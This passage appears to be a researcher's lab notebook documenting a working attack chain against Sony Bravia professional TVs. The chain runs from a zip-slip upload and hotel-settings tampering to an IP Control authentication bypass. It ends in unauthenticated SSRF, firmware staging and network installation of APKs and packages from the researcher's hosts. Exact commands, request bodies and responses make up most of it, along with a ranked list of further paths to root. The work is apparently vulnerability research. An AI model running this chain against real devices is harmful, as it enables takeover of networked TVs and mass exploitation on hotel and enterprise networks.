4. Fix: `pm enable --user 0 com.sony.dtv.b2b.hotelmode` + reboot
5. After reboot + one successful import: `settings/getProMode` returns
   `{"mode":"normal","mtkMode":0,"mtkCurrentMode":0,"code":0}` ✓

## Import result codes

| Code | Meaning |
|------|---------|
| 0 | SUCCESS |
| 1 | ERROR (generic) |
| 2 | SCREEN_STATE_ERROR |
| 3 | INVALID_MODEL_VARIATION |
| 4 | INVALID_FILE (our test zips) |

---

# Round 18 (2026-11-14): NETWORK-DRIVEN PRIVILEGED APP INSTALLATION — FULL CHAIN

## The complete attack chain (all 7 steps verified)

```
1. Webui digest auth (admin password we set via PasswordActivity)
2. ZIP-SLIP: path traversal in settings import writes BPK to USB stick
   └─ POST /api/import with entry ../../../../../../storage/2218-68D6/extapp_installer.pkg
   └─ MD5 verified on device: 7bb5db1369fe39dd8360345ef909032d
3. Hotel settings provider: bpk_installation = On
   └─ content insert --uri content://com.sony.dtv.b2b.hotelsettings/hotel
4. USB re-mount: sm unmount/mount public:8,0
   └─ usbmsgservice chain fires
5. AppInstallerCore processes the BPK (Sony's own signed package)
6. extapp_basic_installer3 UI shows on TV (one remote-button confirm)
7. → REMOTE FIRMWARE UPDATE SERVICE INSTALLED AND RUNNING
   └─ NodeProcessService1 exec: remote-firmware-update-service/index.js
   └─ Listening on [::]:20335 (ALL INTERFACES)
```

## What was installed

**com.sony.tv.b2b.app.remote_firmware_update_service v2.2.1**
- Express server on port 20335 (all interfaces — directly network-exposed!)
- API: `/firmware/api/v1/{information,version,requests}` (POST/GET/PUT/DELETE)
- TvClient bridge methods: startFirmwareUpdate, cleanupFwWrite, reboot,
  getFirmwareVersion, enableDryRunMode, isAbUpdateSupported
- Source decrypted offline: 3.6MB, MD5 verified
- The `url` parameter in firmware requests = firmware download URL
- DryRun modes: 0=none, 1=offerpayload only, 2=full

## The remaining gate: IP Control authentication

The firmware service's auth middleware reads the TV's IP Control auth mode
via bridge `system/getIpControlAuthentication` (returns `{"auth":0,"psk":""}`).
Auth mode 0 matches NO allowed case (1=none, 2/3=PSK) → all requests 403.

**Fix**: set IP Control auth mode to 1 (none) via:
- `system/setIpControlAuthentication` bridge call (crashed the webui when we
  tried — likely same NPE pattern as settings/*), OR
- ProSettingsService `setIPControl({authentication_mode: 1})` via probe, OR
- The TV's Pro Settings menu (IRCC remote)

## The BPK installation gate (SOLVED)

`isBpkUsbAutoRunPermitted()` checks hotel setting `bpk_installation`:
- NULL (provider missing) → permitted (how the webui originally installed)
- "On" → permitted
- "Off" → BLOCKED

After enabling hotelmode package, the setting defaulted to "Off".
Fixed via: `content insert --uri content://com.sony.dtv.b2b.hotelsettings/hotel
--bind name:s:bpk_installation --bind value:s:On` (exact case "On" required).

## Sony BPK inventory (all in NodeRuntimePrivilege assets/preinstall/)

| BPK | Size | Status |
|-----|------|--------|
| bravia-web-control-ui | 11.4MB | INSTALLED (round 11) |
| remote_firmware_update_service | 874KB | INSTALLED (this round) |
| bravia-updater | 8.2MB | NOT INSTALLED |
| crestronconnected | 6.6MB | NOT INSTALLED |

All four can be installed via the same network-driven chain.

## Remaining BPKs worth exploring

- **bravia-updater**: system updater — potentially firmware-level access
- **crestronconnected**: commercial AV control — likely IR/power/config access

## Webui crash/recovery notes

- `system/setIpControlAuthentication` bridge call crashed the webui (NPE pattern)
- After `am force-stop`, the app enters "stopped" state; services can't be
  restarted from shell ("app is in background uid null")
- BootReceiver is not exported; `pm disable` blocked (signature-protected)
- **Recovery: reboot the TV** — all node services auto-start, settings persist

---

# Round 19 (2026-11-14): FIRMWARE UPDATE SERVICE — FULLY UNLOCKED, UNAUTHENTICATED

## IP Control auth bypass

ProSettingsService probe (uid 1000 context):
```java
setIPControl({"authentication_mode": "1"})  → true
getIpControlAuthentication()                → 1 (none)
```

After service restart: the firmware update service on port 20335 now accepts
ALL requests without authentication (authMode=1 → middleware passes through).

## CONFIRMED: Unauthenticated SSRF + firmware write

```
POST /firmware/api/v1/requests
  {"url":"http://10.0.0.14:9876/test-firmware.bin","update":false}
→ 201 Created {"state":"downloading","id":1}

[Server log] [SERVED] /test-firmware.bin to ('10.0.0.178', 50542) (42 bytes)

GET /firmware/api/v1/requests
→ {"requests":[{"url":"...","state":"ready","id":1}]}

DELETE /firmware/api/v1/requests/1 → 204 (cleaned up)
```

**The TV made an outbound HTTP connection to our test server and downloaded
the payload — with ZERO authentication on port 20335.**

## The complete vulnerability chain (18 rounds to build)

```
Round 11: BPK chain → bravia-web-control-ui installed (physical USB)
Round 14: MasterKey decryption → full webui source
Round 15: PasswordActivity → digest auth credentials
Round 17: Zip-slip in settings import (CWE-22)
Round 18: Network-driven BPK installation (zip-slip → USB → re-mount)
Round 19: IP Control auth bypass + firmware service unlock
```

## Security impact

**Attack: any device on the network can:**
1. `POST http://<tv>:20335/firmware/api/v1/requests` with any URL
2. The TV downloads from that URL (SSRF — confirmed)
3. Data written to firmware write path (prepareFwWrite socket)
4. With `update: true`, auto-apply attempted

**Mitigations that remain:**
- Firmware signature verification (likely blocks unsigned updates)
- The update would need to be a properly signed Sony package

**But the SSRF and unauthenticated firmware write are REAL:**
- Network scanning via the TV (SSRF)
- Firmware update DoS (corrupt the active request)
- Data exfiltration channel (the TV fetches attacker-controlled URLs)
- On hotel/enterprise networks: mass exploitation of all Bravia TVs

---

# Round 20 (2026-11-14): BPK analysis + firmware pipeline path planning

## BPK analysis (all four decrypted, source-level)

### crestronconnected v2.0.11
- The `InstallAPK/CrestronConnected.apk` (com.sony.dtv.b2b.crestronsettings)
- Just a UI shell (StartupActivity, LEANBACK_LAUNCHER) — NO special permissions
- **NOT JUICY** — the node service part might be more interesting but the APK is benign

### bravia-updater v1.3.4+995 (38MB)
- **TWO variants**: `bravia-updater` (Android side) and `bravia-updater_UroO`
- **The UroO variant runs on the TV-OS side:**
  - `"user": "500"` — a completely different uid (TV-OS app user)
  - `"arg": "/var/app/node_services/bravia-updater_UroO/index.js"` — TV-OS filesystem
  - `"node_version": "v6.9.1"` — OLD node (2017!) on the TV-OS side
- The `encript.js` module searches for key/cert files (SSL keys for the updater)
- **JUICY**: the TV-OS side is the separate Linux system we've been unable to reach

## The firmware update pipeline (complete source analysis)

### Architecture
```
POST /firmware/api/v1/requests {"url": "...", "update": true/false}
  → tvClient.prepareFwWrite()          [bridge → system service]
  → returns socket_name                ["/data/upgrade/upgrade_pkg_b2b.zip"]
  → Downloader(url, socket_name)        [downloads from ANY URL]
  → reliableFileWriter OR b2bcmdFileWriter
      ├── reliableFileWriter: writes to socket_name as a regular file
      │   (used when isAbUpdate=true — Android 10 A/B updates)
      └── b2bcmdFileWriter: connects to ABSTRACT UNIX socket
          ├── abstractSocket.connect('\0' + socket_name)
          ├── sends {"method": "PUT", "path": "/upgrade/upgrade_loader.pkg"}
          ├── streams binary data (type 0x02 packets)
          └── close (type 0x02, length 0)
  → doUpdate() → tvClient.startFirmwareUpdate() → reboot()
```

### The b2bcmd protocol (root daemon)
```
Packet: [1B type][4B BE length][payload]
  type 0x00 = JSON: {"method": "PUT"/"HEAD", "path": "..."}
  type 0x02 = binary data / close (length 0)

The PUT path is HARDCODED to /upgrade/upgrade_loader.pkg in the client.
The abstract socket name comes from prepareFwWrite().
```

### The attack surface map

| Write target | Method | Status |
|---|---|---|
| /storage/emulated/0/ (shared) | zip-slip | ✓ WORKS |
| /storage/<USB>/ (USB mounts) | zip-slip | ✓ WORKS |
| /data/user/0/<app>/ (app private) | zip-slip | ✗ SELinux blocks (cross-app) |
| /data/system/ | zip-slip | ✗ SELinux blocks (system_data_file) |
| /data/local/tmp/ | zip-slip | ✗ DAC blocks (root:shell 0771) |
| /data/upgrade/ | reliableFileWriter | ? (node process context, uid 10033) |

### The remaining barriers and paths to root

**Path A: Code execution in a node process** (to speak b2bcmd protocol)
- Need to inject JavaScript into the webui or firmware service
- Zip-slip can't reach app data dirs (SELinux)
- ChunkUploadStorage writes to /dev/null
- Multer filename is hardcoded (import.zip)
- **OPEN**: any other code injection vector in the webui?

**Path B: The b2bcmd daemon directly**
- The PUT path is hardcoded in the client
- The abstract socket name comes from prepareFwWrite()
- Need a way to speak the protocol with a controlled path
- **OPEN**: can we connect to the abstract socket from shell?

**Path C: The TV-OS side (bravia-updater UroO)**
- Runs as uid 500 on /var/app/ — the separate Linux system
- Node v6.9.1 (2017, MANY known vulns)
- **OPEN**: install the UroO variant via BPK chain → code on TV-OS side

**Path D: The node v6.9.1 on TV-OS (if we can install UroO)**
- Node 6.9.1 is from 2017 — dozens of critical CVEs
- Buffer overflow, RCE, etc. in that version
- **OPEN**: what's the actual exposure?

## SELinux assessment
- `getenforce` → Enforcing
- `setenforce 0` → Permission denied (shell can't)
- Kernel cmdline has no `androidboot.selinux=permissive`
- SELinux config is read-only (/sys/fs/selinux/)
- **No known bypass from our current access level**
- The ProSettingsService's setSystemProperty is firmware-gated (can't set SELinux props)

---

# Round 21 (2026-11-14): Full updater API control + complete BPK fleet deployment

## Unauthenticated APK install (VERIFIED)

```
POST http://<tv>:20343/sony/updater
{"id":20,"method":"installAndroidPackage","params":[{"url":"http://10.0.0.14:9877/PSProbe.apk"}],"version":"1.0"}
→ 202 accepted → download → android/installApk bridge (unattended=true)
→ on-screen approval dialog (one remote press) → APK INSTALLED
Verified: versionName=1.2, lastUpdateTime=02:28:48
```

Same-version reinstalls are skipped (bumped versionCode to force).

## Network BPK install (VERIFIED — zero USB)

```
POST /sony/updater {"method":"installPackage","params":[{"url":".../crestron-extapp.pkg"}]}
→ download → BPK decrypt (AppInstallerCore) → install
→ crestronsettings APK + 4th node service (port 20341) installed
→ NO approval dialog (Sony-signed BPKs are trusted wholesale)
```

**All 4 Sony BPKs now deployed over the network**: web-control-ui,
remote-firmware-update-service, bravia-updater, crestronconnected.

## The service fleet (all network-deployed)

| Port | Service | Auth | Notes |
|------|---------|------|-------|
| 20335 | remote-firmware-update-service | NONE | SSRF + firmware staging |
| 20338 | bravia-web-control-ui | digest | settings import/export |
| 20341 | crestronconnected | own UI auth | CIP client (outbound TLS) |
| 20343 | bravia-updater | NONE | **full package manager** |

## updateFirmware chain (mapped + tested)

```
POST /sony/updater updateFirmware {url, dryRunMode}
  → enableDryRunMode(0/1/2) → prepareFwWrite → socket_name
  → A/B path: downloads URL content DIRECTLY to
    /data/upgrade/upgrade_pkg_b2b.zip (uid 10033 file write!)
  → startFirmwareUpdate() → TV-OS UpdateSessionManager + MtkTvSwUpgrade JNI
  → TV-OS validates (dry-run 2 = verify only) → invalid pkg rejected silently
```

- dryRunMode: 0=apply, 1=offerpayload only, 2=full dry run
- Our 28-byte probe: staged successfully, TV-OS session ran, rejected silently
- **We can stage ARBITRARY content in the TV-OS upgrade path on demand**

## Root path assessment (current state)

**Blocked:**
- Firmware forging: Sony's pinned signer keys (4× SHA-256, Round 10)
- TV-OS validator: opaque; rejects invalid/unsigned packages
- SELinux: setenforce denied; no permissive cmdline; blocks cross-app
  writes, device nodes (/dev/cli despite root:shell DAC), abstract sockets
- TV-OS filesystem (/var/, /data/upgrade/): invisible from all our contexts
- setSystemProperty: firmware-gated (UnsupportedOperationException)

**Open paths (ranked):**
1. **Firmware downgrade**: stage an older signed PKG via updateFirmware
   (URL is ours; no client-side version check). Needs: Sony CDN URL for
   older XBR-55X800H packages + anti-rollback behavior unknown. Risk: brick.
2. **ProSettingsService setter audit**: full IProSettingsService enumeration
   from our APK (uid 1000-side setters: wireless/network/system/features).
3. **Kernel driver audit**: 18 cached .ko files; SELinux gates device access.
4. **TV-OS package format research**: upgrade_pkg_b2b.zip format unknown —
   if it's not the firmware PKG but a lighter B2B format, validation may differ.
